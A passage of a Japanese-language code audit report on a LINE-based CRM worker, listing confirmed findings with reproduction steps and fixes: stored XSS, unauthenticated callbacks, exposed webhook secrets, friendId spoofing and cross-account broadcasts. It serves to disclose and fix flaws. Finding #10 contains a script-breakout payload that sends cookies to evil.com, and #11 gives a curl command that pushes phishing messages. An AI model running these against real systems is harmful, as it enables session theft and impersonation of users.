(2) send_message / send_webhook を持つ automation も削除時に発火するため、「タグ追加時にウェルカム送信」を意図した設定が削除でも送信してしまう(最も自然かつ影響の大きいケース)。
(3) タグ復活シナリオ({tag_change, tag_id:X}→add_tag:X)は実在するが、add_tag は addTagToFriend を直接呼び tag_change を再発火しないため無限ループではなく「削除のたびに1回復活」=UI から削除不能、という単発挙動。しかも自己参照的な特殊設定が前提。所見の「無限」寄りの表現はやや誇張だが、単発でも UI 削除が効かなくなる点は正しい。

総じて、tag_change automation が add/remove を区別できず両方で発火する、という中核バグは実在・到達可能で誤動作を確認できたため CONFIRMED。

</details>

### 8. [🟠 HIGH] 「制限なし」(max_bookings_per_friend=null) イベントが実質1件/人に絞られ、2件目が挿入後ロールバックされる

- **観点**: バグ/正当性 / `bug-booking-events` ・ **判定**: `CONFIRMED` ・ 分類: correctness
- **場所**: `apps/worker/src/routes/events.ts:1066`

**内容**: LIFF 予約作成のフレンド上限チェックは前段(986行)では `if (event.max_bookings_per_friend != null)` でガードされ、コメント通り max=null なら「制限なし・チェックスキップ」となる。ところが挿入後の再検証ブロック(1066-1095行)は無条件で実行され、`const effectiveMax = event.max_bookings_per_friend ?? 1` を使う。つまり max=null のイベントでは実効上限が 1 に化ける。同一 identity_key の active 予約が 2 件になると cnt2(=2) > effectiveMax(=1) が真となり、後着の行を DELETE して 409 duplicate_friend_booking を返す。983行『制限なし』と1065行『max=null は1件まで』のコメントが矛盾しており、admin UI の『制限なし』契約に反する。

**失敗シナリオ**: max_bookings_per_friend を未指定(=null, create 時のデフォルト)で作成したイベントに、同一フレンドが 2 つ目のスロットを予約する。前段チェックは null なのでスキップ→INSERT 成功→再検証で effectiveMax=1、active 件数 2 > 1 となり新規行が DELETE され 409 duplicate_friend_booking。フレンドは『制限なし』のはずが 2 件目を一切取れない。

**悪用可能性/再現条件**: 上記の通り。デフォルト(null)構成・通常 LIFF フロー・race 不要で確実に再現。

**推奨対応**: 再検証ブロックも前段と同じく `if (event.max_bookings_per_friend != null)` でガードするか、`effectiveMax` を null のとき Infinity(=無制限)として扱う。983行と1065行のコメントの矛盾も解消し、null の意味(無制限 or 1)を一意に決める。

<details><summary>検証者の根拠</summary>

所見は実在。該当コードを実読して全前提を確認した。events.ts:1066-1095 の再検証ブロックは前段(986)の `if (max != null)` ガードと異なり無条件の bare block で、`effectiveMax = event.max_bookings_per_friend ?? 1`(1067)により max=null が実効上限 1 に化ける。EventDbRow.max_bookings_per_friend は number|null(834)で、SELECT(921-933)は null を coercion 無しでそのまま渡すため、null は 986 と 1067 の両方に到達する。DB 列は nullable・デフォルト無し(migrations/037:22)、create は未指定を null にフォールバック(190)、admin UI は null⇄「制限なし」(event-form.tsx:542-551) と対応し、コードが破る「無制限」契約が確定。トレース: 2 件目は前段スキップ→INSERT 成功で active 2 件→effectiveMax=1、cnt2=2>1 真→winner を最古 1 行に限定→後着行 DELETE→409 duplicate_friend_booking。982 行『制限なし・チェックスキップ』と 1065 行『max=null は1件まで』のコメントも実際に矛盾しており、コードは後者に従う。さらにテスト作者自身が events.test.ts:1636 で「max=null は制限なし、重複検知には 1 を明示」と intended semantics をコメントしており、かつ『max=null で 2 件許可』を検証するテストは存在せず欠陥は未捕捉。到達可能・悪用/誤動作を確認したため CONFIRMED。深刻度は high 維持: デフォルト構成で発生し、ユーザー向けに明示された「無制限」機能を静かに無効化し、繰り返し予約という正当なユースケースを破壊し、誤解を招く duplicate_friend_booking を返す。ただしデータ破損やセキュリティ/PII 影響は無く(DELETE は副作用ファンアウト前)、critical ではない。

</details>

### 9. [🟠 HIGH] /api/meet-callback が無認証 + line_user_id のグローバル解決で任意フレンドへの push・metadata 上書きを許す

- **観点**: バグ/正当性 / `bug-booking-events` ・ **判定**: `CONFIRMED` ・ 分類: correctness
- **場所**: `apps/worker/src/routes/meet-callback.ts:28`

**内容**: authMiddleware は `/api/meet-callback` を明示的に認証バイパス(auth.ts:180)。ハンドラは `getFriendByLineUserId`(friends.ts:93, `SELECT * FROM friends WHERE line_user_id = ?` = line_account_id 無視のグローバル1件取得)で friend を解決し、body.transcripts / requirements_doc を Flex にして friend の所属アカウントの channel_access_token で pushMessage する。さらに friend.metadata を body 由来の内容で上書き UPDATE する。呼び出し元の署名/秘密鍵検証は一切ない。

**失敗シナリオ**: 認証なしの第三者が line_user_id を推測/収集して POST /api/meet-callback を投げると、そのフレンドに攻撃者制御の Flex メッセージが送信され(送信事故)、friends.metadata が任意 JSON で上書きされる。マルチアカウントで同一 line_user_id が複数アカウントに存在する場合は先頭1件が選ばれ、意図と異なるアカウント/フレンドに送信・保存される。

**悪用可能性/再現条件**: 前提: 攻撃者は有効な line_user_id(U + 32 hex, 約128bit=総当り不可)を1つ入手していること。ただし LINE user ID はログ/CSV エクスポート/同一 provider 配下の他 bot 等から漏洩・収集されうる。入手済みなら、認証・署名なしで `POST /api/meet-callback`(body: line_user_id, transcripts[], requirements_doc 等)を投げるだけで再現。影響: (a) 当該フレンドへテナント公式チャネルから攻撃者制御 Flex メッセージ送信(送信事故/なりすまし/フィッシング)、(b) レート制限が無いため同一 ID への反復送信で push クォータ枯渇/スパム、(c) friends.metadata.meet_hearing に任意 JSON を格納(格納型データ汚染)、(d) 同一 line_user_id が複数アカウントに存在する場合は先頭1件が選ばれ意図と異なるテナントへ送信・保存(クロステナント誤配)。総当りは非現実的だが、line_user_id 漏洩は現実的で、成立時の影響(信頼された公式チャネル経由のメッセージ注入 + 格納型汚染)が大きいため high。認証完全不要だが arbitrary な line_user_id 入手が律速となり critical には至らない。

**推奨対応**: エンドポイントに共有シークレット/HMAC 署名検証を追加(または authMiddleware バイパスから除外)。フレンド解決は line_user_id 単独ではなく account スコープ(呼び出し元が識別するアカウント)込みで行い、複数一致時の曖昧さを排除する。

<details><summary>検証者の根拠</summary>

所見の主要主張はすべてコードで裏取りできた。(1) auth.ts:180 が `/api/meet-callback` を認証スキップ allowlist に明示。app.use('*', authMiddleware)(index.ts:152)がルート(index.ts:198)より前で走るため、ハンドラは Bearer/cookie/CSRF 検証なしで実行される。(2) meet-callback.ts:9-105 に署名/共有秘密/ヘッダ/IP 検証は一切なく、検査は body.line_user_id の存在のみ(24行)。"meet" を参照するのは mount・handler・bypass の3ファイルだけで、秘密鍵の定義は存在しない。(3) getFriendByLineUserId(packages/db/src/friends.ts:93-101)は `SELECT * FROM friends WHERE line_user_id = ?` + .first() で line_account_id フィルタなし=全テナント横断の先頭1件取得。単一 D1 相乗り構成のため、同一 line_user_id が複数アカウントに存在すると意図しないアカウント/フレンドが選ばれうる。(4) body.transcripts[].transcript / question_text / requirements_doc がそのまま Flex 化され、解決した friend の所属アカウントの channel_access_token(lines 34-40)で pushMessage(line 76)されるため、テナントの公式 LINE チャネル経由で攻撃者制御メッセージが当該フレンドに送信される(なりすまし/フィッシング面が深刻)。(5) friend.metadata はスコープ付きマージ({...existing, meet_hearing:{...}})で更新される(lines 84-99)。所見の「任意 JSON で上書き」は範囲をやや誇張(既存キーは残り meet_hearing 配下のみ、ただし context は Record<string,unknown> で任意 JSON 格納可)だが、格納型インジェクションとして実在は変わらない。反証は成立せず、到達可能・ガード不在・悪用可能を確認。

</details>

### 10. [🟠 HIGH] 格納型XSS: buildAppRedirectHtml の不完全エスケープで </script> ブレイクアウト

- **観点**: セキュリティ / `sec-injection` ・ **判定**: `CONFIRMED` ・ 分類: xss-injection
- **場所**: `apps/worker/src/routes/tracked-links.ts:250`

**内容**: buildAppRedirectHtml() (249-277) は destinationUrl(=link.original_url)を escaped=replace(/&/g,'&amp;').replace(/"/g,'&quot;') として & と " のみエスケープし、< と > を素通しする。この値を <script> ブロック内(270行 window.location.href="${intentEscaped}"、272行 window.location.href="${escaped}")へ直接展開している。HTMLトークナイザの script-data 状態は引用符に関係なくリテラル </script> を終端として探すため、original_url に </script> を含めると script が早期終了し後続の注入スクリプトが実行される。original_url は POST/PATCH /api/tracked-links で検証ゼロのまま verbatim 保存され(createTrackedLink packages/db/src/tracked-links.ts:118-139、route 137-152 は truthy チェックのみ)、buildAppRedirectHtml は isAppLinkDomain(new URL().hostname が x.com 等)true 時に /t/:linkId(公開・無認証、367行)から end-user に配信される。同一 codebase に正しい escapeHtml(og-html.ts:10 / liff.ts:1741 が <,>,&,",' を網羅)が存在するのに未使用。worker origin は全テナントの LIFF/API/管理セッション(lh_admin_session)と同一オリジンのため影響大。

**失敗シナリオ**: 任意ロールの認証済み staff(POST /api/tracked-links は requireRole 無し)が originalUrl=https://x.com/</script><script>fetch('https://evil.com/?c='+document.cookie)</script> で作成→verbatim保存。被害者(友だち/管理者)が公開の https://<worker>/t/<shortCode> を通常ブラウザで開くと isAppLinkDomain('x.com')=true で buildAppRedirectHtml が走り、< > 未エスケープのため </script> が script を閉じ注入スクリプトが worker オリジン上で実行。同一オリジンAPI呼び出し・PII読み出し・データ持ち出しが可能。intent:// 分岐(254-256,269-270)も同様。

**悪用可能性/再現条件**: Preconditions: (1) attacker holds a valid staff API key of any role (no requireRole on the tracked-links routes; usable via Bearer for SDK/MCP, or cookie+CSRF). (2) Attacker creates a link with originalUrl pointing at an app-link domain and containing a </script> breakout, e.g. POST /api/tracked-links {"name":"x","originalUrl":"https://x.com/</script><script>fetch('https://evil/?d='+encodeURIComponent(document.cookie))</script>"} — no spaces, so new URL() parses hostname=x.com and isAppLinkDomain returns true. Stored verbatim. (3) Victim opens the public https://<worker>/t/<shortCode> in a normal browser (not a link-preview bot, not the LINE in-app UA — for app-link domains the LIFF branch is also skipped, line 314). isAppLinkDomain(true) -> buildAppRedirectHtml runs -> the raw </script> in either intentEscaped (line 269) or escaped (line 272) closes the <script> element and the injected script executes on the worker origin. Because there is no CSP, the inline injection runs. Impact ceiling: the injected script issues same-origin fetch to /api/* which the browser credentials with the HttpOnly lh_admin_session cookie, and reads the non-HttpOnly lh_csrf cookie to set X-CSRF-Token, defeating CSRF — full authenticated action as any admin/staff whose browser holds a worker-origin session and opens the link. Tracked links are designed to be distributed to end users/broadcast, giving a natural delivery channel, and the shared single-D1 multi-tenant origin means cross-tenant impact. Mitigating: requires an authenticated staff account to plant and a victim with a worker-origin session for the highest-value outcome (plain end-users only get arbitrary JS on the worker origin without an admin session to abuse).

**推奨対応**: 全展開箇所を既存 escapeHtml(<,>,&,",' を網羅)で処理する。さらに <script> 文字列内は文字列連結でなく JSON.stringify(url) か data-* 属性経由でJSに渡す。加えて作成/更新時に original_url を new URL() で http/https 限定検証し正規化して保存する。

<details><summary>検証者の根拠</summary>

Genuine stored XSS. buildAppRedirectHtml (apps/worker/src/routes/tracked-links.ts:249-277) escapes only & and " on destinationUrl (line 250, and line 256 for the intent variant), leaving < and > raw, then interpolates the value inside a <script> block (lines 269-272). The HTML script-data tokenizer terminates on any literal </script> regardless of surrounding quotes, so a URL containing </script><script>…</script> closes the script early and executes injected script. original_url is stored verbatim: the route (tracked-links.ts:122-160) only truthiness-checks name/originalUrl, and createTrackedLink (packages/db/src/tracked-links.ts:118-139) binds it directly with no validation. The gate isAppLinkDomain (line 219-226) does new URL(url).hostname, which parses https://x.com/</script>… successfully with hostname x.com (parsing does not throw on <,> in the path, and the code never re-serializes — it passes the raw stored string to buildAppRedirectHtml at line 367). c.html() performs no escaping. /t/:linkId is public/unauthenticated (middleware/auth.ts:145,158). A correct escapeHtml that covers < > & " ' exists in og-html.ts:10-17 but is not used here. Crucially, there is NO Content-Security-Policy anywhere in apps/worker/src (grep for content-security-policy/secureHeaders/etc. is empty; only cors + rate-limit + auth middleware are registered), so nothing blocks the inline script. No role gate exists on POST /api/tracked-links, so any authenticated staff (lowest role) can plant the payload. The only inaccuracy in the finding is its document.cookie exfil claim: lh_admin_session is HttpOnly (auth.ts:68) so the token cannot be read via document.cookie — but this does not diminish the exploit, because the XSS executes on the worker origin, same-origin fetch to /api/* auto-sends the HttpOnly session cookie, and the deliberately non-HttpOnly lh_csrf cookie (auth.ts:80) is readable by the injected script to satisfy the X-CSRF-Token double-submit check, yielding full authenticated API abuse / PII exfiltration across the shared single-D1 multi-tenant origin.

</details>

### 11. [🟠 HIGH] /api/meet-callback が完全無認証で任意友だちへの push 送信とmetadata上書きを許す

- **観点**: セキュリティ / `sec-public-webhooks` ・ **判定**: `CONFIRMED` ・ 分類: missing-auth
- **場所**: `apps/worker/src/routes/meet-callback.ts:9`

**内容**: auth.ts:180 で `/api/meet-callback` は認証スキップ。署名も共有シークレットも無い(env に IG_HARNESS_LINK_SECRET のような仕組みはあるが未使用)。body.line_user_id で友だちを引き当て、(a) 攻撃者が指定した transcripts / requirements_doc を差し込んだ Flex を公式アカウントから当該ユーザへ pushMessage(meet-callback.ts:76)し、(b) friends.metadata.meet_hearing を攻撃者JSONで上書き(meet-callback.ts:97)する。

**失敗シナリオ**: POST /api/meet-callback {line_user_id:'<被害者のUid>', transcripts:[{question_text:'重要',transcript:'<フィッシング文/URL>'}], requirements_doc:'...', session_id:'x', scenario_id:'x', status:'x', completed_at:'x'} → 被害者のトークに公式アカウント名義で攻撃者本文が届く(送信事故)。metadata も改ざんされ、繰り返せば push クォータ枯渇・嫌がらせに悪用可能。

**悪用可能性/再現条件**: 再現条件: (1) POST /api/meet-callback は auth.ts:180 で認証スキップされ、meet-callback.ts 全107行に署名/共有シークレット/HMAC 検証が一切無い(唯一のガードは line_user_id 必須と friend 存在確認のみ)。到達性・無認証は実在確定。(2) 攻撃者は対象 bot に存在する有効な line_user_id を1つ知っている必要がある。これが唯一かつ実質的な前提条件。LINE UID は不透明な33文字で総当り不可能なため「匿名攻撃者が前提知識ゼロで任意ユーザを攻撃」は不可。ただし UID は webhook payload/CRM エクスポート/ログ/参照トラッキング等で頻繁に露出し、getFriendByLineUserId が単一 D1 を line_account スコープ無しで横断検索するため、あるテナントの悪意ある内部者が他テナントの友だち UID を知っていれば越境で push/metadata 改ざん可能(クロステナント経路)。(3) 有効 UID を得れば: 攻撃者指定の transcripts/requirements_doc を差し込んだ Flex を公式アカウント名義で被害者トークへ pushMessage(meet-callback.ts:76)= 信頼済み公式アカウントからのフィッシング/送信事故。friends.metadata.meet_hearing を攻撃者 JSON で上書き(meet-callback.ts:97、既存 metadata は spread マージなので meet_hearing キーのみ改変)。レート制限は当該ルートに無く、反復による push クォータ枯渇・嫌がらせが可能。(4) 404(friend not found)応答が UID 有効性オラクルになるが 128bit 空間の列挙は非現実的。再現例: curl -X POST https://<worker>/api/meet-callback -H 'Content-Type: application/json' -d '{"line_user_id":"U<被害者UID>","session_id":"x","scenario_id":"x","status":"x","completed_at":"x","transcripts":[{"question_text":"重要","transcript":"<フィッシング文/URL>"}],"requirements_doc":"..."}'

**推奨対応**: Meet Harness 用の共有シークレット(Authorization ヘッダ or HMAC 署名)を必須化し、検証失敗は 401。line_user_id の所有証明が無いまま push/metadata 変更を行わない。

<details><summary>検証者の根拠</summary>

所見は事実正確。auth.ts:180 で /api/meet-callback は明示的に認証スキップ(return next())され、Bearer/cookie/CSRF いずれも要求されない。meet-callback.ts を全読したが署名・共有シークレット・HMAC 等の入力検証は皆無で、ガードは body.line_user_id 必須(24-26行)と friend 存在(28-31行)のみ。攻撃者制御の transcripts/requirements_doc がそのまま Flex テキスト(43-49, 66-69行)となり pushMessage(76行)で公式アカウントから被害者へ送信され、UPDATE friends SET metadata(97行)で meet_hearing が改ざんされる、という 2 つの副作用も実在確認。所見が指摘する「IG_HARNESS_LINK_SECRET のような仕組みはあるが未使用」も正確で、index.ts:111 に env として存在し liff.ts:85 で outbound の X-LINE-HARNESS-LINK-SECRET として使われているのに当該 inbound では未適用=単純な検証漏れ。getFriendByLineUserId は line_account スコープ無しの全件検索(friends.ts:93-101)でクロステナント解決を許す。到達不能・既存ガード・事実誤認のいずれも該当せず REJECTED ではない。完全確証(コード実在+悪用経路成立)が取れたため PLAUSIBLE でもなく CONFIRMED。深刻度は申告 critical だが、唯一の前提として「対象 bot 上の有効 line_user_id を知っていること」が必要で、UID は総当り不能・非公開のため匿名者による無差別大量悪用は不可。一方 UID は各種連携面で漏洩しやすく、単一 D1 横断検索による越境や、信頼済み公式アカウント名義のフィッシング送信事故・レート制限不在によるクォータ枯渇/嫌がらせ・CRM データ改ざんという実害は重大。したがって critical はやや過大、実世界影響で high に再評価。

</details>

### 12. [🟠 HIGH] 公開GET /api/forms/:id が送信webhookのURL・認証ヘッダ(シークレット)を露出

- **観点**: セキュリティ / `sec-public-webhooks` ・ **判定**: `CONFIRMED` ・ 分類: secret-exposure
- **場所**: `apps/worker/src/routes/forms.ts:37`

**内容**: serializeForm は onSubmitWebhookUrl(forms.ts:37)と onSubmitWebhookHeaders(forms.ts:38)を返し、公開ハンドラ GET /api/forms/:id(forms.ts:84-91、auth.ts:179 で無認証)がそれをそのまま出力する。onSubmitWebhookHeaders は callFormWebhook(forms.ts:649-654)が外部呼び出しの認証ヘッダとして使う運用で、Authorization/API キーが入る想定。誰でも読める。

**失敗シナリオ**: GET /api/forms/<id> → レスポンスに onSubmitWebhookHeaders: {"Authorization":"Bearer sk_live_..."} や token 埋め込みの onSubmitWebhookUrl が含まれ、連携先の資格情報が窃取される。

**悪用可能性/再現条件**: 再現条件: (1) 運用者がフォームに onSubmitWebhookUrl と onSubmitWebhookHeaders を設定し、ヘッダに外部連携先の資格情報(Authorization: Bearer... 等)を格納している、(2) 攻撃者が対象フォーム ID を知っている。フォーム ID は crypto.randomUUID()(packages/db/src/forms.ts:128)= UUIDv4 で推測不可だが、LIFF フォーム URL として一般ユーザーへ配布される値(フォーム描画のため公開 GET で誰でも取得する前提)。公開リード獲得フォームでは ID は事実上公開情報であり、リンク受領者=不特定多数の誰でも `GET /api/forms/<id>` を叩けばレスポンスの onSubmitWebhookHeaders / onSubmitWebhookUrl から連携先資格情報を平文取得できる。認証・レート制限・テナントスコープなし(getFormById は line_account 非スコープの単純 SELECT *)。露出する資格情報は連携先(外部サービス)のものであり CRM 自体の認証情報ではない。デフォルト(webhook 未設定)では何も漏れず、条件付き。ただし本フィールドは X 連携で意図的にクライアント配布される dual-use のため、運用者がサーバ専用シークレットと誤認して格納するリスクを助長する。

**推奨対応**: 公開読取レスポンスから onSubmitWebhookUrl / onSubmitWebhookHeaders / onSubmitWebhookFailMessage を除外する(公開用シリアライザを分ける)。これらは認証済み管理APIのみで返す。

<details><summary>検証者の根拠</summary>

所見の各主張をコードで実地確認し、いずれも事実であることを確認した。

1. serializeForm(forms.ts:24-51) は onSubmitWebhookUrl(line 37)と onSubmitWebhookHeaders(line 38)を無条件に出力に含める。フィルタ/マスクなし。
2. 公開ハンドラ GET /api/forms/:id(forms.ts:84-96)は line 91 で `serializeForm(form)` を extra なしで呼び、上記2フィールドをそのままレスポンスに載せる。
3. 無認証であることを auth.ts:179 で確認。`path.match(/^\/api\/forms\/[^/]+$/)` にマッチすると認証前に return next() する(コメントに "GET form definition (public for LIFF)")。Bearer/Cookie 認証・CSRF チェックの手前で通過するため誰でも到達可能。getFormById(packages/db/src/forms.ts:103)は `SELECT * FROM forms WHERE id=?` で全カラム取得。
4. callFormWebhook(forms.ts:635-677)は on_submit_webhook_headers を JSON.parse して外部 fetch のヘッダに Object.assign し(line 649-654)、outbound 呼び出しの認証ヘッダとして使う運用。作成/更新 API(forms.ts:110,159 / packages/db/src/forms.ts:119,175)は任意ヘッダ JSON を受け付け、警告もない。よって Authorization/API キーが正当に格納され得る。

結論: 無認証の公開エンドポイントが、サーバ側 webhook で認証ヘッダとして使う想定の onSubmitWebhookHeaders と onSubmitWebhookUrl を平文でそのまま返す。到達可能・悪用可能な情報露出として実在する。

【重要な反証検討と留保】完全な "既知の設計" による無効化ではないが、severity を割り引く材料を発見した: クライアント側フォーム描画コード apps/worker/src/client/form.ts:863-871 の getWebhookHeaders() が、公開 GET で取得した onSubmitWebhookHeaders をブラウザ内で読み、X Harness API(engagement gate)呼び出しのヘッダに使っている。つまり本フィールドは少なくとも一部フロー(X連携)では設計上ブラウザに配布される前提であり、「純粋なサーバ専用シークレット置き場」ではなく dual-use。したがって「必ずシークレットが漏れる」わけではなく、サーバ側 webhook 機能を認証付きで設定した運用者がヘッダに実シークレット(例: Bearer sk_live_...)を入れた場合に限り漏洩する条件付き露出。ただしサーバ側 callFormWebhook は認証ヘッダ利用を明確にサポートしており、その運用は自然に発生し得るため、実害シナリオは現実的。露出メカニズム自体はコードで100%確定しているため CONFIRMED とする。

</details>

### 13. [🟠 HIGH] 公開フォーム submit/partial が friendId/lineUserId 詐称で任意友だちへの push・metadata改ざんを許す

- **観点**: セキュリティ / `sec-public-webhooks` ・ **判定**: `CONFIRMED` ・ 分類: broken-access-control
- **場所**: `apps/worker/src/routes/forms.ts:296`

**内容**: submit(forms.ts:296)と partial(forms.ts:265)は id_token 検証なしでクライアント指定の friendId/lineUserId を信頼する。submit は当該友だちへ確認Flexを pushMessage(forms.ts:600)し、tag付与・シナリオ登録・metadataマージを行い、trackedLinkId で報酬テンプレも選べる(forms.ts:426、リプレイ防止は forms.ts:414-417 で意図的に無効)。partial は body.data を friends.metadata にマージ上書き(forms.ts:282-286)。同 LIFF 系の send-form-link(liff.ts:1852)は idToken を必須にしているのに、submit/partial は未検証で非対称。

**失敗シナリオ**: POST /api/forms/<id>/partial {friendId:'<uuid>', data:{任意キー:'値'}} で被害者 metadata を改変。POST /api/forms/<id>/submit {lineUserId:'<被害者>', data:{...}} で公式アカウントから被害者へ『診断結果』Flex を push。lineUserId→friendId は /api/liff/profile オラクル(liff.ts:1232)で取得可能。

**悪用可能性/再現条件**: 前提: 認証不要の公開エンドポイント。CORSと rate-limit(auth前に走る)は存在するが認可ゲートではない。/ 報酬リプレイ詐取: 攻撃者自身の friendId のみで POST /api/forms/<id>/submit {friendId:'<self>', trackedLinkId:'<任意>', data:{必須項目}} を反復すれば、anti-replay無効(forms.ts:414-417)により報酬テンプレ push を無制限に再取得可能。前提は自分のIDのみで極めて容易。/ 被害者標的攻撃(要 friendId or lineUserId): friendId はランダムUUIDで直接列挙不可だが、/t/?f=<friendId> 付き tracked-link URL(forms.ts:591-593)で実流通するため転送・referer 漏洩・スタッフ/アフィリエイト経由で入手可能。lineUserId が判れば公開の /api/liff/profile(liff.ts:1232)で friendId を取得できる。(a)POST /api/forms/<id>/partial {friendId:'<victim>', data:{任意キー:'値'}} で被害者 metadata を任意上書き。(b)POST /api/forms/<id>/submit {friendId:'<victim>', data:{見せたい文字列...}} で公式アカウント名義の『診断結果』Flex(回答値は攻撃者制御の任意テキスト)を被害者へ push、フィッシング/ブランド毀損。/ 単一D1マルチテナントのため、対象IDさえ得られれば他テナントの友だちにも横断的に作用しうる。CSRF不要(Bearer/Cookie不要のため素の cross-origin fetch/curl で可)。恒久対策は send-form-link と同じ idToken 検証(sub==lineUserId)を submit/partial にも課すこと。

**推奨対応**: submit/partial にも idToken 検証(verified.sub == lineUserId、send-form-link と同等)を必須化し、friendId 直指定は撤廃。metadata マージはサーバ側フィールド許可リストで制限する。

<details><summary>検証者の根拠</summary>

所見は実在し、反証は成立しなかった。(1) auth.ts:176-178 が /api/forms/:id/submit・/partial を authMiddleware から明示除外しており、Bearer/Cookie/CSRF いずれのゲートも到達しない完全公開エンドポイントであることを確認。(2) submit(forms.ts:296-)・partial(forms.ts:265-)は id_token 検証を一切行わず、body.friendId / body.lineUserId をそのまま getFriendById / getFriendByLineUserId(テナント・所有権スコープなしの素の検索)で解決する。(3) submit は解決した友だちへ確認Flexを pushMessage(forms.ts:600、他に:502,:368)、tag付与(:452)、シナリオ登録(:457)、metadataマージ(:435-447)を実行し、報酬テンプレは body.trackedLinkId で任意選択可能(:426)。(4) リプレイ防止は forms.ts:414-417 のコメントで意図的に無効化されている。(5) partial は body.data を friends.metadata に上書きマージ(:282-286)。(6) 決定的なのは非対称性で、同系の send-form-link(liff.ts:1831-1882)は idToken を必須化し LINE の verify で sub==lineUserId を検証し、その理由コメント(liff.ts:1847-1851)が『lineUserId を知る攻撃者が被害者を任意 tracked_link_id/報酬に固定できてしまう』という本件とまさに同一の脅威を明記している——にもかかわらず、より重い副作用を持つ submit/partial は未検証。(7) 公開の /api/liff/profile(liff.ts:1232)が lineUserId→friendId(+userId/displayName)を返すオラクルとして実在。以上より IDOR/なりすまし脆弱性は確実に成立。深刻度は、被害者を狙う攻撃には対象の friendId(ランダムUUID)か lineUserId(不可推測)を要する一方、(a)報酬リプレイ詐取は自分のIDのみで無制限に成立、(b)friendId は /t/?f= 付きURLで実際に流通、(c)公式アカウント名義の任意テキスト入り『診断結果』Flex 送信によるフィッシング、(d)任意友だちの metadata 整合性破壊、(e)開発者自身が同一脅威を隣接エンドポイントで認識・対策済み、を総合し high と評価。単一D1全テナント相乗りのため他テナント友だちも対象になり得る点も加味。

</details>

### 14. [🟠 HIGH] タグ配信の宛先が line_account_id 未フィルタ（クロスアカウント送信事故 + messages_log 帰属汚染）

- **観点**: セキュリティ / `sec-tenant-isolation` ・ **判定**: `CONFIRMED` ・ 分類: cross-account-send
- **場所**: `apps/worker/src/services/broadcast.ts:101`

**内容**: target_type='all' は inline で LINE broadcast API（アカウント固有）を使い、queue のセグメント配信は `WHERE f.line_account_id = ?`（broadcast.ts:341）でアカウント絞り込みする。しかし target_type='tag' の宛先解決は inline（broadcast.ts:101）も queue（broadcast.ts:348）も `getFriendsByTag(db, target_tag_id)`（tags.ts:100、アカウント引数なし・WHERE に line_account_id 無し）を使い、全アカウントの当該タグ保有友だちを返す。tags テーブルは line_account_id を持たない完全グローバル（schema.sql、name UNIQUE）なので、タグは複数アカウントの友だちに横断付与され得る。配信は broadcast の line_account_id のトークン（route send:531 / service）で multicast されるため、送信元アカウント外の友だちへ送信を試み、messages_log には送信元アカウント固定値が書かれる。

**失敗シナリオ**: 運用者がアカウント A（line_account_id=A）で target_type='tag'、tag='VIP' のブロードキャストを送信。'VIP' タグ（グローバル）はアカウント B の友だちにも付いている。送信時 getFriendsByTag は A/B 両方の友だちを返し（broadcast.ts:101/102 は is_following のみで除外せず）、A のチャネルトークンで multicast（broadcast.ts:127）。同一プロバイダ配下の多アカウント構成（このプロダクトの標準的なマルチアカウント運用）では userId が共通のため、B のみをフォローしている想定の重複フォロワーに A の配信が届く送信事故になる。さらに B 所属友だちの messages_log 行が line_account_id=A で記録され（broadcast.ts:133-138）、アカウント別分析・友だち履歴が汚染される。'all'/'segment' 経路（broadcast.ts:341）はアカウント絞り込み済みで、tag 経路だけ欠落している非対称が根拠。

**悪用可能性/再現条件**: Not an external attack; triggered by normal operator action in a multi-account (multi-tenant) deployment. Repro: (1) Because `tags.name` is globally UNIQUE with no `line_account_id` (schema.sql:30-35), any two accounts A and B that use the same tag name (e.g. "VIP") share one global tag id, and `friend_tags` (40-45) links it to friends of both accounts. (2) Operator creates a broadcast on account A with target_type='tag', target_tag_id=VIP, and sends it. (3) The send path resolves A's channel_access_token (routes/broadcasts.ts:525-532; also scheduled 186-197, queue 223-229) but the recipient list comes from `getFriendsByTag(db, tagId)` (tags.ts:100), which returns ALL friends holding the tag across every account, filtered only by is_following (broadcast.ts:101-103 inline / 347-349 queue). Contrast the segment path (broadcast.ts:340-343) which adds `WHERE f.line_account_id = ?`, and target_type='all' which uses the account-scoped LINE broadcast API — the tag path alone omits the filter. Guaranteed consequence: messages_log rows for account B's friends are inserted with line_account_id=A (broadcast.ts:133-140, 400-408), polluting per-account analytics and B's friend conversation history. Delivery consequence (conditional): friends belonging to B who ALSO follow A's channel actually receive A's message via multicast (broadcast.ts:127/389); in same-provider multi-OA setups userIds are shared so dual-followers are common, whereas distinct-provider tenants get silent non-delivery but still the log pollution. Precondition (shared tag name) is realistic given operators commonly reuse tag names like VIP/資料請求 across accounts.

**推奨対応**: getFriendsByTag にアカウント引数を追加し `AND f.line_account_id = ?`（broadcast の line_account_id）で絞り込む。multi-account-dedup 以外の tag/all/segment 全経路で宛先集合を送信元アカウントにスコープする。既存の getFollowingLineUserIdsByTag（friends.ts:66、accountId 付き）と同じパターンに統一する。

<details><summary>検証者の根拠</summary>

Every technical claim in the finding was verified by reading the code. getFriendsByTag (packages/db/src/tags.ts:100-115) performs `SELECT f.* FROM friends f INNER JOIN friend_tags ft ON ft.friend_id=f.id WHERE ft.tag_id=?` with no account argument and no line_account_id predicate. The tags table (packages/db/schema.sql:30-35) has no line_account_id and name is UNIQUE, so tags are genuinely global and can be assigned to friends of any account via the account-less friend_tags join. friends.line_account_id exists (migration 008) and is documented as webhook-mutable (migration 032). Both the inline tag path (broadcast.ts:101-103) and the queued tag path (broadcast.ts:347-349) call getFriendsByTag and filter only on is_following, whereas the segment path (broadcast.ts:340-343) explicitly adds `WHERE f.line_account_id = ?` and the 'all' path (89-95) uses the account-scoped LINE broadcast API — confirming the exact asymmetry the finding describes. The multicast uses the broadcast's own account token (routes/broadcasts.ts:525-532 and the scheduled/queue resolvers), and messages_log inserts bind the cross-account friend.id with the sender's fixed line_account_id (broadcast.ts:133-140, 400-408), confirming both the cross-account send attempt and the attribution pollution. I could not find any guard scoping the tag or the resolved friends to the sending account anywhere on this path. The bug is real and reachable via the standard broadcast API. I set adjusted_severity to high for the tenant-isolation dimension: the cross-tenant messages_log/analytics pollution is unconditional whenever a tag name is shared across accounts (a realistic operator behavior given globally-unique tag names), and actual cross-tenant message delivery occurs in the same-provider multi-account topology described as the product's standard mode. I stop short of critical because the mis-delivery leg is conditional on the recipient also following the sending channel (LINE silently drops non-followers), so the worst guaranteed effect is cross-tenant data/log pollution rather than universal misdelivery.

</details>

### 15. [🟠 HIGH] 公開 GET /api/forms/:id が Webhook 認証ヘッダ等の連携シークレットを無認証で露出

- **観点**: セキュリティ / `sec-tenant-isolation` ・ **判定**: `CONFIRMED` ・ 分類: secret-exposure
- **場所**: `apps/worker/src/routes/forms.ts:37`

